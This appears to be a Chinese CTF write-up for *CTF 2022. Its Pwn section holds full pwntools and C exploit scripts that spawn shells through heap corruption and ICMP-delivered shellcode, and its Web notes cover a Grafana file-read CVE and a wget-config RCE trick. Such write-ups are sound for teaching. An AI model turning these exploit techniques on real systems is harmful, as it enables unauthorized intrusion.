![](https://cdn.jsdelivr.net/gh/Le0nsec/images/2022/202204201551022.jpeg)

## Web

### oh_my_grafana
CVE-2021-43798 任意文件读取
/etc/grafana/grafana.ini 中有账号密码
登录之后，在explore中可以创建sql模块
利用sql语句查询到flag

### oh_my_lotto
翻了一下wget的源码，发现相关的环境变量中有一个WGETRC，通过指定WGETRC Location可以为wget命令提供参数
```
http_proxy = http://z5dn1o.dnslog.cn
```
上传文件并设置WGETRC环境变量为/app/guess/forecast.txt
本地可以成功设置代理并发出dnslog请求,远程并不能收到dnslog请求，但是远程环境将无法下载新的开奖号码拿上一次的开奖号码就可以得到flag。
![](https://cdn.jsdelivr.net/gh/Le0nsec/images/2022/202204201546558.png)

### oh_my_lotto_revenge
wget命令可以通过use_askpass参数执行可执行文件
但是use_askpass需要对应文件有可执行权限，直接通过设置output_document指定文件保存路径来覆盖bin目录下的文件，这样让代理服务器返回一个恶意文件，在保存到本地是也会继承bin目录下的可执行权限，最后通过指定use_askpass为覆盖的文件就可以rce
## Pwn
### examination

```python
from pwn import*
context.log_level = 'debug'
context.arch = 'amd64'

#s = process('./examination')
s = remote('124.70.130.92',60001)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def init_role(role):
	s.sendlineafter(b'role: <0.teacher/1.student>: ', str(role))

def add_s(num):
	s.sendlineafter(b'choice>> ', b'1')
	s.sendlineafter(b'enter the number of questions: ', str(num))

def give_score():
	s.sendlineafter(b'choice>> ', b'2')

def write_view(c,index,size,comment):
	s.sendlineafter(b'choice>> ', b'3')
	s.sendlineafter(b'which one? > ', str(index))
	if(c):
		s.sendafter(b'enter your comment:\n', comment)
	else:
		s.sendlineafter(b'please input the size of comment: ', str(size))
		s.sendafter(b'enter your comment:\n', comment)

def call_parent(index):
	s.sendlineafter(b'choice>> ', b'4')
	s.sendlineafter(b'which student id to choose?', str(index))

def change_role(role):
	s.sendlineafter(b'choice>> ', b'5')
	s.sendlineafter(b'role: <0.teacher/1.student>: ', str(role))

def t_exit():
	s.sendlineafter(b'choice>> ', b'6')

def test():
	s.sendlineafter(b'choice>> ', b'1')

def check(ptr):
	s.sendlineafter(b'choice>> ', b'2')
	s.sendafter(b'add 1 to wherever you want! addr: ', ptr)

def pray():
	s.sendlineafter(b'choice>> ', b'3')

def mode(p,score,mode):
	s.sendlineafter(b'choice>> ', b'4')
	if(p):
		s.sendlineafter(b'enter your pray score: 0 to 100\n', str(score))
	else:
		s.sendafter(b'enter your mode!\n', mode)

def change_id(index):
	s.sendlineafter(b'choice>> ', b'6')
	s.sendlineafter(b'input your id: ', str(index))

#0x5080

init_role(0)

add_s(1) # 0
add_s(1) # 1
add_s(1) # 2
write_view(0,0,0x80,b'a'*0x80)
write_view(0,1,0x80,b'a'*0x80)
write_view(0,2,0x80,b'a'*0x80)

change_role(1)
pray()
change_id(2)
pray()

change_role(0)
give_score()

change_role(1)
change_id(2)

s.sendlineafter(b'choice>> ', b'2')
s.recvuntil(b'Good Job! Here is your reward! ')
heap_base = int(s.recv(14),16) - 0x340
success('heap_base=> '+hex(heap_base))

ptr = heap_base + 0x1f
success('ptr1=>'+hex(ptr))
s.sendafter(b'add 1 to wherever you want! addr: ', str(ptr))

change_role(0)
add_s(1) # 3
write_view(0,3,0x80,b'a'*0x80)
call_parent(1)

change_role(1)
s.sendlineafter(b'choice>> ', b'2')
s.recvuntil(b'Good Job! Here is your reward! ')
heap_base = int(s.recv(14),16) - 0x2a0
success('heap_base=> '+hex(heap_base))

ptr = heap_base + 0x2e2
success('ptr2=>'+hex(ptr))
s.sendafter(b'add 1 to wherever you want! addr: ', str(ptr))

libc_base = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x1ecbe0
success('libc_base=>' +hex(libc_base))

system = libc_base + libc.sym['system']

change_role(0)

payload = b'/bin/sh\x00' + b'a'*0x80 + p64(0x91) + b'b'*0x80 + p64(0x90)*2 + b'c'*0x88
payload+= p64(0x31) + p64(heap_base + 0x570) + b'\x00'*0x20
payload+= p64(0x21) + p64(0x1) + p64(libc_base + libc.sym['__free_hook'])

write_view(1,0,0x80,payload)

write_view(1,3,0x80,p64(system))

call_parent(0)

#gdb.attach(s)
s.interactive()
```
### BabyNote
```python
from pwn import*
r=remote("123.60.76.240",60001)
#r=process('./main')
context.log_level='debug'

libc=ELF("./libc.so")

def new(name_size,name,note_size,note):
	r.recvuntil("option: ")
	r.sendline("1")
	r.recvuntil(": ")
	r.sendline(str(name_size))
	r.recvuntil(": ")
	r.send(name)
	r.recvuntil(": ")
	r.sendline(str(note_size))
	r.recvuntil(": ")
	r.send(note)

def show(name_size,name):
	r.recvuntil("option: ")
	r.sendline("2")
	r.recvuntil(": ")
	r.sendline(str(name_size))
	r.recvuntil(": ")
	r.send(name)

def delete(name_size,name):
	r.recvuntil("option: ")
	r.sendline("3")
	r.recvuntil(": ")
	r.sendline(str(name_size))
	r.recvuntil(": ")
	r.send(name)

def clean():
	r.recvuntil("option: ")
	r.sendline("4")

def exit():
	r.recvuntil("option: ")
	r.sendline("5")

new(0x2C,"a"*0x2C,0x2C,"a"*0x2C)
new(0x2C,"b"*0x2C,0x2C,"b"*0x2C)
new(0x3C,"c"*0x3C,0x3C,"c"*0x3C)
delete(0x2C,"a"*0x2C)

clean()
new(0x2C,"d"*0x2C,0x2C,"d"*0x2C)
new(0x2C,"e"*0x2C,0x2C,"e"*0x2C)
delete(0x2C,"d"*0x2C)
new(0x3C,"f"*0x3C,0x3C,"f"*0x3C)

show(0x3C,"d"*0x2C+"\n")
r.recvuntil(":")
pie=""
for i in range(8): pie+=chr(int(r.recv(2),16))
pie=u64(pie)-0x4c40
success("pie: "+hex(pie))

new(0x2C,"a"*0x2C,0x3C,"a"*0x3C)
clean()

new(0x2C,"a"*0x2C,0x2C,"a"*0x2C)
new(0x2C,"b"*0x2C,0x2C,"b"*0x2C)
new(0x3C,"c"*0x3C,0x3C,"c"*0x3C)
delete(0x2C,"a"*0x2C)

clean()
new(0x2C,"d"*0x2C,0x2C,"d"*0x2C)
new(0x2C,"e"*0x2C,0x2C,"e"*0x2C)
delete(0x2C,"d"*0x2C)
new(0x7C,"f"*0x7C,0x7C,"f"*0x7C)

show(0x3C,"d"*0x2C+"\n")
r.recvuntil(":")
libc_base=""
for i in range(8): libc_base+=chr(int(r.recv(2),16))
libc_base=u64(libc_base)-0xb7f50
success("libc_base: "+hex(libc_base))

malloc_context=libc_base+0xb4ac0
ofl_head=libc_base+0xb6e48
mem_addr=libc_base-0x6000
execve=libc_base+libc.sym["execve"]
gadget=libc_base+0x7b1f3
pop_rdi=libc_base+0x152a1

new(0x2C,"a"*0x2C,0x3C,"a"*0x3C)
clean()

new(0x2C,"\x01"*0x2C,0x2C,"\x01"*0x2C)
new(0x2C,"\x02"*0x2C,0x2C,"\x02"*0x2C)
new(0x2C,"\x03"*0x2C,0x2C,"\x03"*0x2C)
new(0x2C,"\x04"*0x2C,0x2C,"\x04"*0x2C)
new(0x2C,"\x05"*0x2C,0x2C,"\x05"*0x2C)
new(0x2C,"\x06"*0x2C,0x2C,"\x06"*0x2C)
show(0x2C,"\x00"*0x2C)
delete(0x2C,"\x01"*0x2C)
show(0x2C,p64(mem_addr+0x110)+p64(malloc_context)+p64(0)+p64(0x8)+"\n")

show(0,"")
r.recvuntil(":")
secret=""
for i in range(8): secret+=chr(int(r.recv(2),16))
secret=u64(secret)
success("secret: "+hex(secret))

new(0x2C,"\x00"*0x2C,0x2C,"\x00"*0x2C)
new(0x3C,"\x00"*0x3C,0x3C,"\x00"*0x3C)
clean()

fake_chunk=p64(mem_addr+0x10)+p64(0)+p64(0)+p64(0)
libc_base
sc=10
freeable=1
last_idx=0
maplen=1
fake_meta=p64(secret)+p64(0)
fake_meta+=p64(ofl_head-0x8)
fake_meta+=p64(mem_addr+0x200)
fake_meta+=p64(mem_addr+0x100)
fake_meta+=p64(0)
fake_meta+=p64(0x12a0)

fake_IO=p64(0)
fake_IO+=p64(0)
fake_IO+=p64(0)
fake_IO+=p64(0)
fake_IO+=p64(0)
fake_IO+=p64(0x1)
fake_IO+=p64(mem_addr-0x18)
fake_IO+=p64(pop_rdi)
fake_IO+=p64(0)
fake_IO+=p64(gadget)

new(0x2000,"z"*0xFC8+p64(mem_addr-0x8)+p64(execve)+"/bin/sh\x00"+fake_meta.ljust(0x100,"\x00")+fake_chunk.ljust(0x100,"\x00")+fake_IO.ljust(0x100,"\x00")+"\n",0,"")
clean()

new(0x2C,"\x01"*0x2C,0x2C,"\x01"*0x2C)
new(0x2C,"\x02"*0x2C,0x2C,"\x02"*0x2C)
new(0x2C,"\x03"*0x2C,0x2C,"\x03"*0x2C)
delete(0x2C,"\x01"*0x2C)

show(0x2C,p64(0)+p64(0)+p64(0x10)+p64(0)+p64(mem_addr+0x110)+"\n")

#gdb.attach(r,"b close_file")

delete(0,"")

exit()

r.interactive()

```
### ping
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>             // close()
#include <assert.h>
#include <string.h>             // strcpy, memset(), and memcpy()

#include <netdb.h>              // struct addrinfo
#include <sys/types.h>          // needed for socket(), uint8_t, uint16_t, uint32_t
#include <sys/socket.h>         // needed for socket()
#include <netinet/in.h>         // IPPROTO_RAW, IPPROTO_IP, IPPROTO_TCP, INET_ADDRSTRLEN
#include <netinet/ip.h>         // struct ip and IP_MAXPACKET (which is 65535)
#include <netinet/ip_icmp.h>    // struct icmp, ICMP_ECHO
#define __FAVOR_BSD              // Use BSD format of tcp header
#include <netinet/tcp.h>         // struct tcphdr
#include <arpa/inet.h>           // inet_pton() and inet_ntop()
#include <sys/ioctl.h>           // macro ioctl is defined
#include <bits/ioctls.h>         // defines values for argument "request" of ioctl.
#include <net/if.h>              // struct ifreq
#include <linux/if_ether.h>      // ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD
#include <linux/if_packet.h>     // struct sockaddr_ll (see man 7 packet)
#include <net/ethernet.h>
#include <sys/time.h>             // gettimeofday()

#include <errno.h>                 // errno, perror()
#define MAGIC_LEN 0x1F8
#define MTU 1500
#define RECV_TIMEOUT_USEC 100000

#define IP4_HDRLEN 20 // IPv4 header length
#define ICMP_HDRLEN 8 // ICMP header length for echo request, excludes data
#define ETH_HDRLEN 14 // Ethernet header length

uint8_t *MAGIC;
uint8_t *dstIP,*srcIP;
struct icmp_echo {
    uint8_t type;
    uint8_t code;
    uint16_t cksum;
    uint16_t id;
    uint16_t seq;

    double sending_ts;
    char magic[MAGIC_LEN];
};

double get_timestamp() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return tv.tv_sec + ((double)tv.tv_usec) / 1000000;
}

uint16_t checksum(uint16_t *addr, int len) {
    int count = len;
    register uint32_t sum = 0;
    uint16_t answer = 0;

    while (count > 1) {
        sum += *(addr++);
        count -= 2;
    }
    if (count > 0) {
        sum += *(uint8_t *)addr;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    answer = ~sum;
    return (answer);
}
uint16_t calculate_checksum(unsigned char* buffer, int bytes)
{
    uint32_t checksum = 0;
    unsigned char* end = buffer + bytes;

    // odd bytes add last byte and reset end
    if (bytes % 2 == 1) {
        end = buffer + bytes - 1;
        checksum += (*end) << 8;
    }

    // add words of two bytes, one by one
    while (buffer < end) {
        checksum += buffer[0] << 8;
        checksum += buffer[1];
        buffer += 2;
    }

    // add carry if any
    uint32_t carray = checksum >> 16;
    while (carray) {
        checksum = (checksum & 0xffff) + carray;
        carray = checksum >> 16;
    }

    // negate it
    checksum = ~checksum;

    return checksum & 0xffff;
}


void hexdump(const char *desc, void *addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char *)addr;

    // Output description if given.
    if (desc != NULL)
        printf("%s:\n", desc);
    if (len == 0) {
        printf("  ZERO LENGTH\n");
        return;
    }
    if (len < 0) {
        printf("  NEGATIVE LENGTH: %i\n", len);
        return;
    }

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).
        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printf("  %s\n", buff);
            // Output the offset.
            printf("  %04x ", i);
        }
        // Now the hex code for the specific character.
        printf(" %02x", pc[i]);
        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }
    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf("   ");
        i++;
    }
    // And print the final ASCII bit.
    printf("  %s\n", buff);
}


/*
int sendRequest(int sock, struct sockaddr_in* addr, int ident, int seq)
{
    const int on = 1;
    char *src_ip, *dst_ip,*packet;
    struct ip *ipHeader;
    bzero(&ipHeader, sizeof(ipHeader));
    src_ip         = (int8_t *)calloc(1,INET_ADDRSTRLEN);
    dst_ip         = (int8_t *)calloc(1,INET_ADDRSTRLEN);
    packet         = (uint8_t*)calloc(1,IP_MAXPACKET);
   
    strcpy(src_ip, srcIP);
    strcpy(dst_ip, dstIP);
    
    ipHeader = (struct ip*)packet;
    ipHeader->ip_hl    = IP4_HDRLEN / 4;                  // IP_Header_LEN
    ipHeader->ip_v     = 4;                               // Protocol Type: IPV4
    ipHeader->ip_tos   = 0;                               // Type Of Service
    ipHeader->ip_len   = htons(IP4_HDRLEN + ICMP_HDRLEN + MAGIC_LEN);     // Total Length
    ipHeader->ip_id    = ident;                           // ID sequence number
    ipHeader->ip_off    = 0;
    ipHeader->ip_ttl    = 0x40;                           // Time-to-Live,默认最大值255
    ipHeader->ip_p      = IPPROTO_ICMP;                   // 传输协议包类型

    if ( (inet_pton(AF_INET, src_ip, &(ipHeader->ip_src)) | inet_pton(AF_INET, dst_ip, &(ipHeader->ip_dst))) != 1) {
        perror("inet_pton() failed.");
        return -1;
    }
    ipHeader->ip_sum    = checksum((uint16_t *)ipHeader, IP4_HDRLEN); // Calculate IP_Header Checksum

    struct icmp_echo *icmpHeader;
    
    icmpHeader = (struct icmp_echo*)(packet + IP4_HDRLEN);

    icmpHeader->type     = ICMP_ECHO;
    icmpHeader->code     = 0;            // Message Code
    icmpHeader->id       = htons(ident);  // Identifier
    icmpHeader->seq      = htons(seq);     // Sequence Number
    icmpHeader->cksum    = htons(icmp_checksum((unsigned char*)icmpHeader, sizeof(struct icmp_echo)));   // ICMP Checksum
    icmpHeader->sending_ts = get_timestamp();
    
    memcpy(icmpHeader->magic, MAGIC, MAGIC_LEN);


    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
    	perror("setsockopt() failed to set IP_HDRINCL ");
    	return -1;
    }
    if (sendto(sock, packet, sizeof(struct ip) + sizeof(struct icmp_echo), 0, (struct sockaddr*)addr, sizeof(*addr)) < 0 ) {
    	perror("sendto() failed ");
    	return -1;
    }
    free(src_ip);
    free(dst_ip);
    free(packet);
    puts("Done!");
    return 0;
} 
*/
int sendRequest(int sock, struct sockaddr_in* addr, int ident, int seq)
{
    struct icmp_echo icmpHeader;
    bzero(&icmpHeader, sizeof(icmpHeader));

    icmpHeader.type     = ICMP_ECHO;
    icmpHeader.code     = 0;            // Message Code
    icmpHeader.id       = htons(ident);  // Identifier
    icmpHeader.seq      = htons(seq);     // Sequence Number
    icmpHeader.sending_ts = get_timestamp();
    memcpy(icmpHeader.magic, MAGIC, MAGIC_LEN);

    icmpHeader.cksum    = htons(calculate_checksum((unsigned char*)&icmpHeader, sizeof(struct icmp_echo)));

    int bytes = sendto(sock, &icmpHeader, sizeof(icmpHeader), 0, (struct sockaddr*)addr, sizeof(*addr));
    if (bytes == -1) {  return -1; }

    return 0;
}

int recvReply(int sock, int ident)
{
    char buffer[MTU];
    struct sockaddr_in peer_addr;

    int addr_len = sizeof(peer_addr);
    int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&peer_addr, &addr_len);
    if (bytes == -1) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            return 0;
        }
    	return  -1;
    }
    printf("recv client addr : %s\n",inet_ntoa(peer_addr.sin_addr));
    //hexdump("ping recv", buffer, bytes);
    
    if (bytes > 0x200) return 9;
    else return 0;
    /*
    struct icmp_echo* icmp = (struct icmp_echo*)(buffer + 20);

    if (icmp->type != 0 || icmp->code != 0) {
        return 0;
    }

    if (ntohs(icmp->id) != ident) {
        return 0;
    }

    printf("ping %s seq=%d %5.2fms\n",
        inet_ntoa(peer_addr.sin_addr),
        ntohs(icmp->seq),
        (get_timestamp() - icmp->sending_ts) * 1000
    );
    
    return 0;
    */
}

int ping(const char *IP, uint32_t times)
{
    struct sockaddr_in addr;
    bzero(&addr, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_port = 0;
    if (inet_aton(IP, (struct in_addr*)&addr.sin_addr.s_addr) == 0)  return -1;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); if (sock == -1) return -1;

    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = RECV_TIMEOUT_USEC;
    int ret = setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (ret == -1)  return -1;

    double next_ts = get_timestamp();
    int ident = getpid();
    int seq = 1;

    for (uint32_t i = 0; i < times; i++) {
        if (get_timestamp() >= next_ts) {
            ret = sendRequest(sock, &addr, ident, seq);
            if (ret == -1)  perror("Send failed");
            next_ts++ ;
            seq++;
            ident++;
        }

        ret = recvReply(sock, ident);
        if (ret == 9 ) return  9;
        if (ret == -1)   perror("Recv failed");
    }
    return 0;
}

void setPayload(uint32_t index, char Byte)
{
	memset(MAGIC,'\x90',0x1DC);
	uint32_t *P = (void*)(MAGIC + 0x1DC);
	uint32_t i = 0;
	
	P[i++] = 0x0010C280;
	P[i++] = 0x0010C8AC;
	P[i++] = 0x00000023;
	P[i++] = 0x0010A6B4;
	P[i++] = 0x0010A6B4;
	P[i++] = 0x0010C2C0;
	
	char shellcode[] = "\xb0\xff\x81\xc4\x00\x03\x00\x00\xb9\x00\x00\x35\x00\x8a\x99\xee\x00\x00\x00\x38\xc3\x74\xfc\xb8\x4b\x01\x10\x00\xff\xe0\x90\x90";
	
	shellcode[1] = Byte;
	shellcode[15] = index;
	memcpy(MAGIC + 0x1DC - 0x120,shellcode,0x40);
}
int main(int argc, const char* argv[])
{
    MAGIC = malloc(0x1000);
    char FLAG[0x30];
    memset(FLAG,0,0x30);
    uint32_t front = 23;
    memcpy(FLAG,"*CTF{baby_st4ckoverfL0w}",front);
    for(uint32_t index = front; index < 0x30; index++) {
    
    	for(char Byte = 0x21;Byte < 0x80; Byte++) {
            printf("Index: %d Now byte: %d\n",index,Byte);
	    setPayload(index,Byte);
	    uint32_t retVal =  ping("123.60.8.251",20);
	    if(retVal == 9) {
	    	puts("Continue");
	    	continue;
	    }
	    if(!retVal) {
	    	FLAG[index] = Byte;
	        printf("FLAG:\t%s\n",FLAG);
	    	sleep(60);
	    	break;
	    }
	}
     }
}

```
## Misc
###  Checkin
签到直接拿
## Crypto
### ezRSA
![](https://g.yuque.com/gr/latex?p%2Cq#card=math&code=p%2Cq&id=pbYBM)前124位未改动，即![](https://g.yuque.com/gr/latex?n#card=math&code=n&id=CKdjy)开方后的前124位与![](https://g.yuque.com/gr/latex?p%2Cq#card=math&code=p%2Cq&id=XIKEk)相同
将![](https://g.yuque.com/gr/latex?p%2Cq#card=math&code=p%2Cq&id=YMocm)的![](https://g.yuque.com/gr/latex?300#card=math&code=300&id=NDMCV)到![](https://g.yuque.com/gr/latex?900#card=math&code=900&id=QScpQ)位分别设置为![](https://g.yuque.com/gr/latex?0%2C1#card=math&code=0%2C1&id=wv9Vq)（就每位都不一样就可以）
然后由高到低，在相应位异或![](https://g.yuque.com/gr/latex?1#card=math&code=1&id=he3kj)，判断乘积是否大于![](https://g.yuque.com/gr/latex?n#card=math&code=n&id=cbZ7W)，若大于![](https://g.yuque.com/gr/latex?n#card=math&code=n&id=fOfiz)则保留，若小于![](https://g.yuque.com/gr/latex?n#card=math&code=n&id=TzfYk)则替换
由此可以推导出![](https://g.yuque.com/gr/latex?p%2Cq#card=math&code=p%2Cq&id=d2xjw)的![](https://g.yuque.com/gr/latex?300#card=math&code=300&id=NA2cf)到![](https://g.yuque.com/gr/latex?900#card=math&code=900&id=wkJHr)位。
得到![](https://g.yuque.com/gr/latex?p%2Cq#card=math&code=p%2Cq&id=EmDiN)的高位后就可以利用`coppersmith`方法，在sagemath求小根恢复完整![](https://g.yuque.com/gr/latex?p%2Cq#card=math&code=p%2Cq&id=r6Gxi)

```python
from Crypto.Util.number import*
from gmpy2 import*
n=0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3
print(iroot(n,2)[0])
nb=bin(n)[2:]
ph=bin(iroot(n,2)[0])[2:126]
p=(int(ph+'1'*900,2))^(1<<300-1)
q=int(ph,2)<<900

for i in range(900, 300, -1):
    cur = 1<<i
    if (p^cur) * (q^cur) < n:
        p ^= cur
        q ^= cur

#注意这里的p,q的后300位是不可用的（
print(p)
print(q)
```

```python
#sage
n=0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3
p4=170966211863977623201944075700366958395158791305775637137148430402719914596268969449870561801896130406088025694634815584789789278534177858182071449441084789053688828370314062664371425602830115845954185482614976438192629849706538967060453809829427602914330807612577453856496689047949838362484434161931309285375>>448   #这里怕错只用了前576位（
e=65537
pbits=1024
kbits=pbits - p4.nbits()
p4 = p4 << kbits
PR.<x> = PolynomialRing(Zmod(n))
f = x + p4
roots = f.small_roots(X=2^kbits,beta=0.4)
if roots:
    print("p = ",roots[0]+p4)
```
## Reverse
### Simple File System
```python
f = open("D:/CTF/2022/xctf_6/simple_file_system/image.flag", "rb")

def rof(n, j):
    return ((n << j) | (n >> (8 - j))) & 0xff

while 1:
    con = f.read(0x20)
    if con == b'':
        break
    for i in con:
        if i != 0:
            s = b''
            for t in con:
                n = t
                n = rof(n, 5) ^ 0xde
                n = rof(n, 4) ^ 0xed
                n = rof(n, 3) ^ 0xbe
                n = rof(n, 2) ^ 0xef
                n = rof(n, 1)
                s += n.to_bytes(1, 'big')
            if b"CTF" in s:
                print(s)
            break
f.close()
```
### Jump
```python
import copy
arr = [3, 0x6A, 0x6D, 0x47, 0x6E, 0x5F, 0x3D, 0x75, 0x61, 0x53, 0x5A, 0x4C, 0x76, 0x4E, 0x34, 0x77, 0x46, 0x78, 0x45, 0x36, 0x52, 0x2B, 0x70, 2, 0x44, 0x32, 0x71, 0x56, 0x31, 0x43, 0x42, 0x54, 0x63, 0x6B]
brr = copy.copy(arr)
brr.sort()
flag = b"\x03"
t = 3
while t != 2:
    idx = brr.index(t)
    flag = arr[idx].to_bytes(1, 'big') + flag
    t = arr[idx]
flag = b"*CTF{" + flag[1:-1] + b"}"
print(flag)
```
